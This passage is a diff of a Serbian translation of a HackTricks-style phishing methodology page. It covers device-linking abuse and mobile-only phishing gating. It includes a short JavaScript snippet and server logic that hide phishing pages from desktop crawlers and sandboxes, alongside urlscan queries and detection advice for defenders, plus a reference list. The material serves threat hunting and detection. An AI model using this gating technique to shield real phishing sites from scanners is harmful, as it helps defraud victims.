+* Napadač odmah dobija uvid u četove/kontakte sve dok se sesija ne ukloni. Žrtve mogu kasnije da vide obaveštenje „povezan je novi uređaj”; branioci mogu da traže neočekivane događaje povezivanja uređaja ubrzo nakon poseta nepouzdanim QR stranicama.
 
-### Mobile‑gated phishing to evade crawlers/sandboxes
-Operateri sve češće postavljaju gate ispred svojih phishing tokova pomoću jednostavne provere uređaja, tako da desktop crawlers nikada ne stignu do finalnih stranica. Uobičajen obrazac je mala skripta koja proverava postojanje touch-capable DOM-a i šalje rezultat server endpoint-u; non‑mobile klijenti dobijaju HTTP 500 (ili praznu stranicu), dok mobile korisnici dobijaju kompletan tok.<sup>[[7]](#references)</sup>
+### Mobilni phishing radi izbegavanja crawler-a/sandbox-a
+Operateri sve češće ograničavaju svoje phishing tokove jednostavnom proverom uređaja, tako da desktop crawler-i nikada ne stignu do završnih stranica. Uobičajen obrazac je mala skripta koja proverava da li DOM podržava dodir i šalje rezultat na krajnju tačku servera; klijenti koji nisu mobilni dobijaju HTTP 500 (ili praznu stranicu), dok se mobilnim korisnicima prikazuje ceo tok.<sup>[[7]](#references)</sup>
 
-Minimalni client snippet (tipična logika):
+Minimalni isečak koda na klijentu (tipična logika):
+
 ```html
 <script src="/static/detect_device.js"></script>
 ```
-Logika fajla `detect_device.js` (pojednostavljeno):
+
+`detect_device.js` logika (pojednostavljeno):
+
 ```javascript
 const isMobile = ('ontouchstart' in document.documentElement);
 fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
-.then(()=>location.reload());
+  .then(()=>location.reload());
 ```
-Ponašanje servera koje se često uočava:
-- Postavlja session cookie pri prvom učitavanju.
-- Prihvata `POST /detect {"is_mobile":true|false}`.
-- Vraća 500 (ili placeholder) za naredne GET zahteve kada je `is_mobile=false`; phishing sadržaj poslužuje samo ako je `true`.
 
-Heuristike za hunting i detekciju:
-- urlscan upit: `filename:"detect_device.js" AND page.status:500`
-- Web telemetrija: sekvenca `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za non-mobile; legitimne putanje mobilnih žrtava vraćaju 200 sa pratećim HTML/JS sadržajem.
-- Blokirati ili detaljno proveriti stranice koje sadržaj uslovljavaju isključivo pomoću `ontouchstart` ili sličnih provera uređaja.
+Ponašanje servera koje se često uočava:
+- Postavlja session cookie tokom prvog učitavanja.
+- Prihvata `POST /detect {"is_mobile":true|false}`.
+- Vraća 500 (ili placeholder) za naredne GET zahteve kada je `is_mobile=false`; phishing sadržaj prikazuje samo ako je `true`.
+
+Heuristike za lov i detekciju:
+- Upit za urlscan: `filename:"detect_device.js" AND page.status:500`
+- Telemetrija weba: niz `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za uređaje koji nisu mobilni; legitimne putanje za mobilne žrtve vraćaju 200 i prateći HTML/JS.
+- Blokirajte ili pažljivo proveravajte stranice koje uslovljavaju sadržaj isključivo na osnovu `ontouchstart` ili sličnih provera uređaja.
 
 Saveti za odbranu:
-- Pokretati crawlere sa mobile-like fingerprintima i omogućenim JS-om kako bi se otkrio gated sadržaj.
-- Postaviti alert za sumnjive 500 odgovore nakon `POST /detect` na novoregistrovanim domenima.
+- Pokrećite crawlers sa fingerprintovima nalik mobilnim uređajima i omogućenim JS-om da biste otkrili sadržaj iza provera.
+- Generišite upozorenje na sumnjive odgovore 500 nakon `POST /detect` na domenima koji su nedavno registrovani.
 
 ## References
 
-- [1] [Generisanje varijacija domena koje se koriste u phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
-- [2] [Pronalaženje phishinga: alati i tehnike (0xPatrik)](https://0xpatrik.com/phishing-domains/)
-- [3] [Krađa kredencijala i zaobilaženje 2FA pomoću noVNC-a (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
-- [4] [Krađa sesija i zaobilaženje 2FA pomoću EvilnoVNC-a (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
-- [5] [Kako instalirati i konfigurisati DKIM sa Postfixom na Debian Wheezyju (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
-- [6] [Globalni izveštaj Unit 42 o Incident Response-u za 2025. – izdanje o socijalnom inženjeringu](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
-- [7] [Silent Smishing – phishing infrastruktura ograničena na mobilne uređaje i heuristike (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
-- [8] [Sledeća granica napada Runtime Assembly: korišćenje LLM-ova za generisanje phishing JavaScripta u realnom vremenu](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
-- [9] [Impersonation, Click Hijacking i TDS: uvid u ekosistem distribucije malware-a](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
+- [1] [Generisanje varijacija domena koje se koriste u phishing napadima (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
+- [2] [Pronalaženje phishing stranica: alati i tehnike (0xPatrik)](https://0xpatrik.com/phishing-domains/)
+- [3] [Krađa akreditiva i zaobilaženje 2FA pomoću noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
+- [4] [Krađa sesija i zaobilaženje 2FA pomoću EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
+- [5] [Kako instalirati i konfigurisati DKIM pomoću Postfix-a na Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
+- [6] [Izveštaj Unit 42 o globalnom reagovanju na incidente za 2025. – izdanje o socijalnom inženjeringu](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
+- [7] [Tihi smishing – mobilna phishing infrastruktura i heuristike (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
+- [8] [Sledeća granica napada sklapanjem u toku izvršavanja: korišćenje LLM-ova za generisanje phishing JavaScript-a u realnom vremenu](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
+- [9] [Lažno predstavljanje, otimanje klikova i TDS: uvid u ekosistem distribucije malvera](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
 - [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
-- [11] [Preusmeravanje saobraćaja ka Microsoftovom windows.com pomoću bitflippinga (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
-- [12] [Ljubav? Zapravo: lažna dating aplikacija korišćena kao mamac u ciljanoj spyware kampanji u Pakistanu](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
+- [11] [Otimanje saobraćaja ka Microsoft-ovom windows.com pomoću preokretanja bitova (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
+- [12] [Ljubav? Zapravo: lažna aplikacija za upoznavanje iskorišćena kao mamac u ciljanoj kampanji špijunskog softvera u Pakistanu](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
 - [13] [ESET GhostChat IoC-ovi i uzorci](https://github.com/eset/malware-ioc/tree/master/ghostchat)
 {{#include ../../banners/hacktricks-training.md}}
